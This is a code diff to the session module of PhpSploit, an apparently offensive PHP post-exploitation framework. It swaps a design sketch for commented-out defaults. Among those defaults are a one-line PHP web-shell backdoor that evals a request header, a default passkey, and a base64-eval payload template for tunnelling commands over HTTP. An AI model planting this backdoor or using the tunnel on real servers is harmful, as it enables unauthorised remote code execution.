@@ -4,67 +4,35 @@ When imorted for the first time, the "session" package initializes it
 self as a PhpSploit blank session, with its default values.
 
 """
-import .settings, .environment
-Conf = settings.Init()
-Env  = environment.Init()
+import tempfile, webbrowser
 
-from .pickle import load, dump
+from . import settings
 
+#Conf = settings.init()
+#Conf.REQ_ZLIB_TRY;
 
+#print(Conf.REQ_ZLIB_TRY_LIMIT)
 
-"""BEHAVIOR SIMULATION (subject to modifications, just testing)
-
->>> import session
-
-Setter:
->>> session.Conf.REQ_INTERVAL = "1-5"
->>> setattr(session.Conf, 'REQ_INTERVAL', "1-5")
->>> session.Conf('REQ_INTERVAL', "1-5")
-
-Getter:
->>> session.Conf.REQ_INTERVAL
-(1.0, 5.0)
->>> getattr(session.Conf, 'REQ_INTERVAL')
-(1.0, 5.0)
->>> session.Conf('REQ_INTERVAL')
-(1.0, 5.0)
-
-Checker:
->>> hasattr(session.Conf, 'REQ_INTERVAL')
-True
->>> session.Conf('REQ_INTERVAL') is not NotImplemented
-True
-
-Deleter:
->>> del session.Conf.REQ_INTERVAL
->>> delattr(session.Conf, 'REQ_INTERVAL')
-
-Caller: # return the dynamic value (Interval types return float between tuple)
->>> session.Conf.REQ_INTERVAL()
-3.2
->>> getattr(session.Conf, 'REQ_INTERVAL')()
-4.9
->>> session.Conf('REQ_INTERVAL')()
-2.1
-
-Nice repr: # return a nice, human readable var type representation
->>> session.Conf.REQ_INTERVAL.repr
-
-
-self.CNF['ENV']['CWD']
-session.Environment.CWD
-
-
-
-self.CNF['ENV']['CWD']
-session.Env.CWD
-session.Conf.CWD
-session.Alias.CWD
-
-session.Environment.CWD
-session.Settings.CWD
-session.Aliases.CWD
-
-session.Server.HOME
-
-"""
+## Dirs
+#Conf.TMPPATH  = tempfile.gettempdir()
+#Conf.SAVEPATH = tempfile.gettempdir()
+#
+## Tunnel link opener
+#Conf.TARGET   = None
+#Conf.BACKDOOR = "@eval($_SERVER['HTTP_%%PASSKEY%%']);"
+#Conf.PROXY    = None
+#Conf.PASSKEY  = "phpSpl01t"
+#
+## System tools
+#Conf.TEXTEDITOR = get_texteditor()
+#Conf.WEBBROWSER = webbrowser.get().name
+#
+## HTTP Tunnel configuration settings
+#Conf.HTTP_USER_AGENT     = "file://framework/misc/http_user_agents.lst"
+#Conf.REQ_DEFAULT_METHOD  = "GET"
+#Conf.REQ_HEADER_PAYLOAD  = "eval(base64_decode(%%BASE64%%))"
+#Conf.REQ_INTERVAL        = "1 < 10"
+#Conf.REQ_MAX_HEADERS     = 100
+#Conf.REQ_MAX_HEADER_SIZE = "4 KiB"
+#Conf.REQ_MAX_POST_SIZE   = "4 MiB"
+#Conf.REQ_ZLIB_TRY_LIMIT  = "20 MiB"
